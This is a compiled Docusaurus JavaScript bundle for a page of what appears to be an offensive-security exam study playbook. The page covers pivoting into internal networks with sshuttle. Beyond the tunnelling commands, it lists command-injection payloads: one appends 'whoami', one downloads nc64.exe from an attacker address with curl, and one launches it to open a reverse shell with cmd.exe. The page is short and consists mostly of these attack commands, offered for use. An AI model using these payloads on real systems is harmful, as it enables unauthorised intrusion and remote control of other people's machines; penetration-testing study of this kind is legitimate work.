"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[1497],{472(e,n,s){s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>u,frontMatter:()=>r,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"osep/Tunneling/SSHUTTLE","title":"SSHUTTLE","description":"Basic Connection","source":"@site/docs/osep/Tunneling/SSHUTTLE.md","sourceDirName":"osep/Tunneling","slug":"/osep/Tunneling/SSHUTTLE","permalink":"/OSEP-Playbook/osep/Tunneling/SSHUTTLE","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"title":"SSHUTTLE","sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"Metasploit","permalink":"/OSEP-Playbook/osep/Tunneling/Metasploit"},"next":{"title":"Access Tokens - SeImpersonate","permalink":"/OSEP-Playbook/osep/Privilege Escalation/Access Tokens - SeImpersonate"}}');var o=s(4848),i=s(8453);const r={title:"SSHUTTLE",sidebar_position:2},a=void 0,c={},l=[];function d(e){const n={code:"code",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.p,{children:(0,o.jsx)(n.strong,{children:"Basic Connection"})}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'sshuttle -r [USER]@[SSH_SERVER] --ssh-cmd "ssh -i [ID_RSA-PRIVATE_KEY]" [INTERNAL_IP]/[MASK] (usually like 172.16.XX.0/24)\n\n'})}),"\n",(0,o.jsxs)(n.p,{children:[(0,o.jsx)(n.strong,{children:"Setup a Tunnel to Reach Internal Services"}),"\xa0without using\xa0",(0,o.jsx)(n.code,{children:"proxychains"}),", useful for when we need to access an internal web service"]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'proxychains sshuttle -v -e "ssh -i id_rsa" -r [USER]@[SSH_SERVER] [MASK] (usually like 172.16.XX.0/24)\n\n# Example\nproxychains sshuttle -v -e "ssh -i id_rsa" -r root@172.16.X.197 172.16.X.0/24\n\n# With that we now could reach things like: http://172.16.86.194:8081/, if this is a command injeection we could do, for example the following and get a reverse shell\n127.0.0.1 && whoami\n127.0.0.1 && curl http://192.168.X.Y/nc64.exe -O c:\\windows\\tasks\\nc64.exe\n127.0.0.1 && c:\\windows\\tasks\\nc64.exe 192.168.X.Y 80 -e cmd.exe\n# And then further commands to spawn new shell and even more stable ones.\n'})})]})}function u(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},8453(e,n,s){s.d(n,{R:()=>r,x:()=>a});var t=s(6540);const o={},i=t.createContext(o);function r(e){const n=t.useContext(i);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:r(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);